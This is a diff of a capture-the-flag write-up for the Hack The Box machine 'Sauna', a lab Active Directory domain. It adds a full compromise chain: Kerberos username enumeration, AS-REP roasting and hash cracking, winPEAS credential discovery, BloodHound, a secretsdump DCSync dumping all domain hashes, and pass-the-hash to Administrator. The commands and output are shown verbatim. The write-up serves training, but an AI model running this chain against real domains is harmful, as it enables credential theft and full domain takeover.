@@ -99,6 +99,9 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 
 ![username](../.res/2022-10-21-14-00-30.png)  
 
+- We also have a page with the team so these are other usernames to keep aside for later  
+
+![usernames](../.res/2022-10-22-16-43-41.png)
 - Let's try to enumerate subdomain
 - First we need to modify `/etc/hosts` and add this in the end `10.10.10.175    egotistical-bank.htb`
 - `gobuster dns -d egotistical-bank.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt`  
@@ -109,11 +112,6 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 #### Gobuster port 5985
 
 - `gobuster dir -u http://10.10.10.175:5985/ -w /media/sf_kali-shared/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt`
-
-## Kerberos enumeration
-
-- `nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL',userdb=users.txt 10.10.10.175`  
-  => nothing here
 
 ## MSRPC enumeration
 
@@ -1700,34 +1698,198 @@ Nmap done: 1 IP address (1 host up) scanned in 0.48 seconds
 - We get `hsmith:1234554321`
 => Probably a false positive
 
-## ENUM CHECKLIST
+## Kerberos enumeration
 
-- [x] 53/tcp    open  domain        Simple DNS Plus
-- [x] 80/tcp    open  http          Microsoft IIS httpd 10.0
-- [x] 88/tcp    open  kerberos-sec  Microsoft Windows Kerberos 
-- [x] 139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
-- [x] 389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
-- [x] 445/tcp   open  microsoft-ds?
-- [ ] 464/tcp   open  kpasswd5?
-- [ ] 593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-- [x] 636/tcp   open  tcpwrapped
-- [x] 3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)
-- [x] 3269/tcp  open  tcpwrapped
-- [x] 5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-- [ ] 9389/tcp  open  mc-nmf        .NET Message Framing
-- [x] 49667/tcp open  msrpc         Microsoft Windows RPC
-- [x] 49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
-- [x] 49674/tcp open  msrpc         Microsoft Windows RPC
-- [x] 49677/tcp open  msrpc         Microsoft Windows RPC
-- [x] 49689/tcp open  msrpc         Microsoft Windows RPC
-- [x] 49696/tcp open  msrpc         Microsoft Windows RPC
+- `nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='EGOTISTICAL-BANK.LOCAL',userdb=users.txt 10.10.10.175`  
+  => nothing here
 
-TODO:
+- See if we can find a username with [kerbrute](https://github.com/ropnop/kerbrute)
 
-- Continue ldap enum 
+```bash
+┌──(kali㉿kali)-[~/Documents/sauna]
+└─$ ./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 /usr/share/wordlists/SecLists/Usernames/top-usernames-shortlist.txt 
 
-Resources
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
 
-- https://lisandre.com/archives/2498
+Version: v1.0.3 (9dad6e1) - 10/22/22 - Ronnie Flathers @ropnop
 
-**COMING SOON**
+2022/10/22 16:29:20 >  Using KDC(s):
+2022/10/22 16:29:20 >   10.10.10.175:88
+
+2022/10/22 16:29:20 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
+2022/10/22 16:29:20 >  Done! Tested 17 usernames (1 valid) in 0.072 seconds
+```
+
+- We do get something so it is worth trying other lists
+- Let's try with the one we made using the http and ldap enumeration 
+- Here is the list I have so far
+
+```txt
+jjoy
+jenny.joy
+Admin
+hsmith
+hugo.smith
+fsmith
+fergus.smith
+scoins
+shaun.coins
+sdriver
+sophie.driver
+btaylor
+bowie.taylor
+hbear
+hugo.bear
+skerb
+steven.kerb
+```
+
+- Let's try
+
+```bash
+┌──(kali㉿kali)-[~/Documents/sauna]
+└─$ ./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 users.txt
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/22/22 - Ronnie Flathers @ropnop
+
+2022/10/22 16:45:30 >  Using KDC(s):
+2022/10/22 16:45:30 >   10.10.10.175:88
+
+2022/10/22 16:45:30 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
+2022/10/22 16:45:30 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
+2022/10/22 16:45:30 >  Done! Tested 17 usernames (2 valid) in 0.054 seconds
+
+```
+
+- We find hsmith again but also fsmith is a valid user as well
+
+- Let's try with other lists from the Seclist repo there is a huge one, let's launch it for a while and see what we get
+
+```bash
+┌──(kali㉿kali)-[~/Documents/sauna]
+└─$ ./kerbrute_linux_amd64 userenum -d EGOTISTICAL-BANK.LOCAL --dc 10.10.10.175 /usr/share/wordlists/SecLists/Usernames/xato-net-10-million-usernames.txt 
+
+    __             __               __     
+   / /_____  _____/ /_  _______  __/ /____ 
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
+
+Version: v1.0.3 (9dad6e1) - 10/22/22 - Ronnie Flathers @ropnop
+
+2022/10/22 16:36:54 >  Using KDC(s):
+2022/10/22 16:36:54 >   10.10.10.175:88
+
+2022/10/22 16:37:00 >  [+] VALID USERNAME:       administrator@EGOTISTICAL-BANK.LOCAL
+2022/10/22 16:37:29 >  [+] VALID USERNAME:       hsmith@EGOTISTICAL-BANK.LOCAL
+2022/10/22 16:37:33 >  [+] VALID USERNAME:       Administrator@EGOTISTICAL-BANK.LOCAL
+2022/10/22 16:37:50 >  [+] VALID USERNAME:       fsmith@EGOTISTICAL-BANK.LOCAL
+2022/10/22 16:40:29 >  [+] VALID USERNAME:       Fsmith@EGOTISTICAL-BANK.LOCAL
+```
+
+- We do not get anything new. As it is very huge and we got some hits let's just ctrl+c.
+
+- Let's try hydra again but with fsmith `hydra -l hsmith -P /usr/share/wordlists/rockyou.txt 10.10.10.175 ldap2 -V -f`  
+  => We get a false positive again
+
+- Let's go further with kerberos and try AS-REP Roasting we have the command for impacket GetNPUsers in [lisandre's blog](https://lisandre.com/archives/15304)
+- `python3 /opt/impacket/examples/GetNPUsers.py -no-pass -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -outputfile hashes.txt`
+
+> Please note here that is really important not to forget the .LOCAL in the domain as well as the / in the end.
+
+- We get a hash for fsmith
+
+```bash
+┌──(kali㉿kali)-[~/Documents/sauna]
+└─$ cat hashes.txt 
+$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:def56387c87bb3143856e532996f056c$440373bf3d92a8f10813369507b133c75a97a2072d3dbd7a7b5aa8995c71514c416b70c947d5789ad8c27742c9c8aace244578fa4d91f12a3d20e9855ee746cee50b170290b6e564a69bbdf6e1db4da433366586e964554c46773510e83194564ad141cebf1b51f85268a7ab22681a8600c57e92d388d9f3b59652aafa4e91c8914e747f4fa59cd0bab5fac16c46995e5d4e71bee88d1ce0490853acbc6874b691f71072f298f9077d8254446395cca0e7cfce5453b00a91564055f3f0a33fb96c7b9ff57a6613393b17e4cd5f15a6f3656ca220cde49d90a619c11750d991b025898a3e03f73fd80285fe0eb6e89537a173614e3cbdcc5e2b29c01784b531e6
+```
+
+- Let's try to crack the hash with hashcat `hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt`
+- And we get a password `Thestrokes23`
+
+- Now let's connect with evil winrm `evil-winrm -i 10.10.10.175 -u fsmith -p 'Thestrokes23'`
+
+- We can get the user flag `cat user.txt`
+
+![user flag](../.res/2022-10-22-17-20-59.png)
+
+## Privesc
+
+### Winpeas
+
+- We find creds for svc_loanmanager
+
+```bash
+ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
+    Some AutoLogon credentials were found
+    DefaultDomainName             :  EGOTISTICALBANK
+    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
+    DefaultPassword               :  Moneymakestheworldgoround!
+
+```
+
+- Trying to enumerate things with `svc_loanmanager` does not work
+
+### Bloodhound
+
+- In our evil-winrm session `upload /usr/lib/bloodhound/resources/app/Collectors/SharpHound.exe`
+- `.\SharpHound.exe -c all`
+- `download 20221023164632_BloodHound.zip`
+- In our kali `sudo neo4j console`
+- `bloodhound`
+- We can put the zip in bloodhound
+- Turns out in bloodhound when we search for svc_loanmanager we find `SVC_LOANMGR@EGOTISTICAL-BANK.LOCAL` (we could also have found it using `net user` in our shell)
+- If we do further enumeration with this writing of the username it works
+- We can dump hashes with secretsdump from impacket
+
+```bash
+┌──(kali㉿kali)-[~/Documents/sauna]
+└─$ python3 /opt/impacket/examples/secretsdump.py EGOTISTICALBANK/svc_loanmgr:'Moneymakestheworldgoround!'@10.10.10.175 
+Impacket v0.9.23.dev1+20210528.195232.25c62f65 - Copyright 2020 SecureAuth Corporation
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c:::
+EGOTISTICAL-BANK.LOCAL\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd:::
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c:::
+SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:8a8f2c31c3ccf9e9562999139d4ffd53:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:42ee4a7abee32410f470fed37ae9660535ac56eeb73928ec783b015d623fc657
+Administrator:aes128-cts-hmac-sha1-96:a9f3769c592a8a231c3c972c4050be4e
+Administrator:des-cbc-md5:fb8f321c64cea87f
+krbtgt:aes256-cts-hmac-sha1-96:83c18194bf8bd3949d4d0d94584b868b9d5f2a54d3d6f3012fe0921585519f24
+krbtgt:aes128-cts-hmac-sha1-96:c824894df4c4c621394c079b42032fa9
+krbtgt:des-cbc-md5:c170d5dc3edfc1d9
+EGOTISTICAL-BANK.LOCAL\HSmith:aes256-cts-hmac-sha1-96:5875ff00ac5e82869de5143417dc51e2a7acefae665f50ed840a112f15963324
+EGOTISTICAL-BANK.LOCAL\HSmith:aes128-cts-hmac-sha1-96:909929b037d273e6a8828c362faa59e9
+EGOTISTICAL-BANK.LOCAL\HSmith:des-cbc-md5:1c73b99168d3f8c7
+EGOTISTICAL-BANK.LOCAL\FSmith:aes256-cts-hmac-sha1-96:8bb69cf20ac8e4dddb4b8065d6d622ec805848922026586878422af67ebd61e2
+EGOTISTICAL-BANK.LOCAL\FSmith:aes128-cts-hmac-sha1-96:6c6b07440ed43f8d15e671846d5b843b
+EGOTISTICAL-BANK.LOCAL\FSmith:des-cbc-md5:b50e02ab0d85f76b
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes256-cts-hmac-sha1-96:6f7fd4e71acd990a534bf98df1cb8be43cb476b00a8b4495e2538cff2efaacba
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:aes128-cts-hmac-sha1-96:8ea32a31a1e22cb272870d79ca6d972c
+EGOTISTICAL-BANK.LOCAL\svc_loanmgr:des-cbc-md5:2a896d16c28cf4a2
+SAUNA$:aes256-cts-hmac-sha1-96:10829c15fb61db9307c7f25b01779031e57caf49a26f3ba85e81a80eedfee335
+SAUNA$:aes128-cts-hmac-sha1-96:3a691811fb65c1156f5e2ea822736dc9
+SAUNA$:des-cbc-md5:83b5688ad992abf4
+[*] Cleaning up... 
+```
+
+- We can now connect as Administrator with the hash `823452073d75b9d1cf70ebdf86c7f98e` using evil-winrm
+- We can grab the root flag  
+![root](../.res/2022-10-23-13-08-56.png)
